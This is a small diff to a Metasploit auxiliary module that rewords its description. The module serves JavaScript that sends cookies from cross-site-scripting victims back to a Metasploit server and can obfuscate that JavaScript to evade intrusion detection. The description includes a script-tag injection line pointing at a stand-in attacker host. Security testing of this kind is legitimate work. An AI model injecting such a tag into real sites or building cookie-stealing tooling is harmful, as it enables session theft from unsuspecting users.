@@ -15,15 +15,16 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'			=> 'Capture: HTTP Looging Of Cookies',
 			'Description'	=> %q{
-					This modules runs a webserver that captures cookies from clients of
-				a website vulnerable to cross site scripting. In an attempt
-				to evads IDS this module has an option to obfuscate the generated javascript.
-				To use this script, the following javascript must be injected on the XSS vunlerable
-				site:
-				<script src="http://metasploitserver:port/whatever.js"</script>
+					This module runs a webserver that serves a piece of javascript
+					which will transmit cookies back to metasploit. In an attempt
+					to evade analysis and Intrusion Detection Systems this module has
+					an option to obfuscate the served javascript.
+					To use this module the following javascript must be injected on a
+					website vulnerable to XSS:
+					<script src="http://metasploitserver:port/whatever.js"</script>
 			},
 			'License'	=> MSF_LICENSE,
-			'Author'	=> ['Johnny Vestergaard <jkv[at]unixcluster.dk>', 'jkv']
+			'Author'	=> ['Johnny Vestergaard <jkv@unixcluster.dk>', 'jkv']
 	))
 
 	register_options(
